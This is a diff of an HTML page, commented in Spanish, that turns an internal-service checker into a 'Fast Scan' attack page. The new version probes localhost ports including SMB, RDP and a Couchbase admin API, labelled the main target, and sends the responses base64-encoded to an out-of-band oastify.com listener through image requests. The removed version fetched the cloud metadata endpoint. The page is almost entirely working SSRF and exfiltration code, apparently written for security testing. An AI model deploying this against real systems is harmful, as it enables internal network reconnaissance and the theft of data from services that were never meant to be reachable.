@@ -1,42 +1,55 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Internal Service Check</title>
-</head>
+<head><title>Fast Scan</title></head>
 <body>
-    <h2>Checking internal services...</h2>
-    <div id="result">Loading...</div>
+<script>
+    // 1. Configuración del atacante
+    const listener = "http://4hm8yndvbtz6cvqnyd3xc1cjsay1m1aq.oastify.com/scan";
 
-    <script>
-        // Array de objetivos a probar
-        const targets = [
-            'http://127.0.0.1:8080',
-            'http://localhost:8080',
-            'http://127.0.0.1:80',
-            'http://169.254.169.254/latest/meta-data/'
-        ];
+    // 2. Lista Reducida (Solo lo vital)
+    const ports = [
+        80,    // Web Server Local (IIS/Apache)
+        445,   // SMB (Windows File Sharing)
+        3389,  // RDP (Escritorio Remoto)
+        4985,  // Couchbase Admin API (OBJETIVO PRINCIPAL)
+        8080   // Proxy/Web Alternativo
+    ];
 
-        async function testTargets() {
-            let results = '';
-            
-            for (const target of targets) {
-                try {
-                    const response = await fetch(target);
-                    const text = await response.text();
-                    const base64 = btoa(unescape(encodeURIComponent(text)));
-                    results += `SUCCESS: ${target}\nBASE64: ${base64}\n\n`;
-                } catch (error) {
-                    const errorBase64 = btoa(unescape(encodeURIComponent(`Error: ${error.message}`)));
-                    results += `ERROR: ${target}\nBASE64: ${errorBase64}\n\n`;
+    // 3. Función de Exfiltración
+    function exfiltrate(port, status, data) {
+        const encodedData = btoa(data.substring(0, 200));
+        new Image().src = listener + "?p=" + port + "&s=" + status + "&d=" + encodedData;
+    }
+
+    // 4. Función de Escaneo
+    function checkPort(port) {
+        const target = "http://127.0.0.1:" + port + "/";
+        const controller = new AbortController();
+        // Timeout corto (1.5s) para ir rápido
+        const timeoutId = setTimeout(() => controller.abort(), 1500);
+
+        fetch(target, { signal: controller.signal })
+            .then(response => {
+                return response.text().then(text => {
+                    exfiltrate(port, "OPEN_READABLE", text);
+                }).catch(e => {
+                    exfiltrate(port, "OPEN_OPAQUE", "CORS Blocked");
+                });
+            })
+            .catch(error => {
+                if (error.name !== 'AbortError') {
+                    // Si da error de red inmediato, el puerto suele estar abierto o rechazando activamente
+                    exfiltrate(port, "ERROR_CONN", error.message);
                 }
-            }
-            
-            document.getElementById('result').innerHTML = 
-                '<textarea style="width:100%;height:300px;font-family:monospace">' + 
-                results + '</textarea>';
-        }
+            });
+    }
 
-        testTargets();
-    </script>
+    // 5. Ejecución rápida
+    let delay = 0;
+    ports.forEach(port => {
+        setTimeout(() => { checkPort(port); }, delay);
+        delay += 200; 
+    });
+</script>
 </body>
 </html>
